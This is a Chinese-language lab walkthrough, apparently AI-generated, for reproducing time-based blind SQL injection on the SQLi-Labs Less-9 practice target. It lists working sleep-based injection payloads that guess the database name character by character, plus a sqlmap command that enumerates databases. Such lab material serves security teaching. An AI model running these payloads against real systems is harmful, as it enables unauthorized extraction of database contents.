# SQLi-Labs Less-9 延时注入复现指南：从手动到自动化

### 🧪 SQLi-Labs Less-9 延时注入复现指南

#### 1. 环境准备

- 部署好 **SQLi-Labs** 靶场，确保 Less-9 可访问（如 `http://127.0.0.1/sqli-labs/Less-9/`）

- 本地有 Python 环境（用于 sqlmap），或直接用浏览器测试手动注入

---

### 2. 手动延时注入复现

#### 🔍 步骤1：验证注入点

构造 payload 测试 `if` 条件和 `sleep()` 延时：

```Plain Text

?id=1' and if(1,sleep(5),1)--+
```

- 原理：`if(1,sleep(5),1)` 中条件为真，执行 `sleep(5)`，页面会延迟约5秒加载。

- 验证：若页面明显延迟，说明存在注入点。

#### 📏 步骤2：猜解数据库长度

通过 `length(database())` 逐次测试长度：

```Plain Text

?id=1' and if(length(database())=8,sleep(5),1)--+
```

- 原理：若数据库名长度为8，条件成立，触发5秒延时。

- 验证：页面延迟，说明数据库名长度为8。

#### 🔤 步骤3：逐字符猜解数据库名

使用 `mid()` 截取字符，`ascii()` 转换为ASCII码逐位测试：

```Plain Text

?id=1' and if(ascii(mid(database(),1,1))=115,sleep(5),1)--+
```

- 原理：`mid(database(),1,1)` 取数据库名第1个字符，`ascii()` 转码后与115（字符`s`的ASCII码）比较。

- 验证：页面延迟，说明数据库名第1个字符为`s`，继续修改 `mid()` 的位置参数（如`2,1`）和ASCII码，可完整猜解数据库名（如`security`）。

---

### 3. sqlmap 自动化注入复现

使用 sqlmap 自动检测并利用延时盲注：

```Bash

python3 sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-9/?id=1" --batch --dbs
```

- 参数说明：

    - `-u`：指定目标URL

    - `--batch`：自动选择默认选项，无需交互

    - `--dbs`：枚举所有数据库

- 预期结果：sqlmap 会自动识别延时注入，并返回所有数据库名称（如`information_schema`、`security`等）。

---

### 💡 关键原理

Less-9 属于**基于时间的盲注**，页面无显式回显，通过 `sleep()` 延时判断SQL条件是否成立，从而逐步泄露数据库信息。

---

是否需要我帮你整理一份 **Less-9 延时注入的Python脚本**，实现自动猜解数据库名和表名？这样可以更直观地理解盲注的逻辑。
> （注：文档部分内容可能由 AI 生成）